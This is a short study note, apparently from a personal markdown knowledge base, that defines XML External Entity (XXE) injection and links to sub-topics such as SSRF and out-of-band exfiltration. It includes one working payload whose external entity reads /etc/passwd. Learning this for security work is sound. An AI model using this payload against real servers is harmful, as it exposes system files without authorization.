---
tags:
  - security
  - web
aliases:
  - XML Injection
  - XXE
---
A web exploitation that involves creating XML for the website to transfer server-side files using the include entity feature.
- Allows loading values outside of the [[Document Type Definition|DTD]]
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
# Attacks
- [[XXE File Retrieval]]
- [[XXE SSRF Attack]]
- [[XXE From XInclude]]
- [[XXE From SVG File Upload]]
- [[XXE Out of Bound Data Exfiltration]]
- [[XXE Error Message Exfiltration]]